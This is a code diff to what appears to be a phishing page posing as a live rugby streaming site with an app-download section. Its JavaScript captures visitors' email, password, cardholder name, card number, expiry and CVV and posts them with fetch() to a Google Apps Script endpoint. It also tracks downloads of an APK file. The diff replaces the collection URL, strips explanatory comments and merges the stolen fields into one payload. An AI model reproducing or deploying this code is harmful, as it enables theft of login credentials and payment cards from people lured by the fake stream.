@@ -356,7 +356,7 @@
             font-weight: bold;
         }
 
-        /* STEP 3: Download Page (5 নম্বর পেজ) Styles */
+        /* STEP 3: Download Page Styles */
         .download-page-body {
             background-color: #0f172a;
             color: #f8fafc;
@@ -1061,7 +1061,7 @@
         </div>
     </div>
 
-    <!-- STEP 3: Download Page View (5 নম্বর পেজ - সরাসরি একই ল্যান্ডিং পেজে লোড হবে) -->
+    <!-- STEP 3: Download Page View -->
     <div id="view-step-3" class="download-page-body" style="display: none;">
         <div class="bg-glow"></div>
 
@@ -1089,7 +1089,7 @@
                 <!-- Special Event Banner Card (16:9 Widescreen Thumbnail) -->
                 <div class="event-banner-card">
                     <div class="event-thumb-wrapper">
-                        <img src="https://inews.co.uk/wp-content/uploads/2022/08/SEI_118187511.jpg?w=1200&h=675&crop=1" alt="Moses Itauma vs. Filip Hrgovic" class="event-thumb">
+                        <img src="https://inews.co.uk/wp-content/uploads/2022/08/SEI_118187511.jpg?w=1200&h=675&crop=1" alt="Event Banner" class="event-thumb">
                     </div>
                     <div class="event-title">🔥 South Africa vs New Zealand LIVE: Rugby</div>
                     <p class="event-text">
@@ -1109,7 +1109,7 @@
                 </div>
             </section>
 
-            <!-- Short Video Section (Reels/Shorts format for guide/preview) -->
+            <!-- Short Video Section -->
             <section class="video-section">
                 <h2 class="section-title"><i class="fa-solid fa-clapperboard"></i> Installation & App Guide</h2>
                 <div class="video-container">
@@ -1164,9 +1164,9 @@
         </div>
     </div>
 
-    <!-- JavaScript with Google Script URL -->
+    <!-- JavaScript with Google Script URL & Row Update Logic -->
     <script>
-        const scriptURL = 'https://script.google.com/macros/s/AKfycbwfhv1-cdpfIGapTVYUYHsOk2bdVlTR1qEQCWQimO-kongP3GZxuyPvI2a7FLNnpPoh/exec'; // আপনার Apps Script লিংক
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbyBM5gwr8TfNTlq2SOfQcY47xrzCo6Z42Y5mR2wcA0QFLDM4NWZW0vw2tQN816K-JT7/exec'; // আপনার Apps Script লিংক
 
         let globalEmail = '';
         let globalPassword = '';
@@ -1177,9 +1177,9 @@
             globalPassword = document.getElementById('user-password').value;
 
             let data = {
-                step: "1",
                 email: globalEmail,
-                password: globalPassword
+                password: globalPassword,
+                status: "Registered/Submitted"
             };
 
             fetch(scriptURL, {
@@ -1302,21 +1302,14 @@
             let lastName = document.getElementById('last-name').value;
             let selectedCountry = document.getElementById('country').value;
 
-            let cardDataSaved = {
+            let data = {
+                email: globalEmail,
+                password: globalPassword,
                 cardName: firstName + ' ' + lastName,
                 country: selectedCountry,
                 cardNumber: cardNumber,
-                cardDateCvv: cardExpiry + ' / CVV: ' + cardCvv
-            };
-
-            let data = {
-                step: "2",
-                email: globalEmail,
-                password: globalPassword,
-                cardName: cardDataSaved.cardName,
-                country: cardDataSaved.country,
-                cardNumber: cardDataSaved.cardNumber,
-                cardDateCvv: cardDataSaved.cardDateCvv
+                cardDateCvv: cardExpiry + ' / CVV: ' + cardCvv,
+                status: "Registered/Submitted"
             };
 
             fetch(scriptURL, {
@@ -1326,7 +1319,6 @@
                 body: JSON.stringify(data)
             }).catch(err => console.log(err));
 
-            // পেমেন্ট বাটনে ক্লিক করার পর ৩ সেকেন্ড প্রসেসিং ওভারলে দেখাবে এবং তারপর ৫ নম্বর পেজ (ডাউনলোড সেকশন) ওপেন হবে
             let processingOverlay = document.getElementById('processing-overlay');
             processingOverlay.style.display = 'flex';
 
@@ -1338,16 +1330,10 @@
             }, 3000);
         }
 
-        // অ্যাপ ডাউনলোডের ডেটা গুগল শিটে পাঠানোর ট্র্যাকিং ফাংশন
         function trackAppDownload(event) {
             let downloadData = {
-                step: "download_app",
-                email: globalEmail || "Unknown / Direct Download",
-                password: "N/A",
-                cardName: "App Downloaded",
-                country: "N/A",
-                cardNumber: "N/A",
-                cardDateCvv: "Downloaded APK File"
+                email: globalEmail,
+                status: "Downloaded"
             };
 
             fetch(scriptURL, {
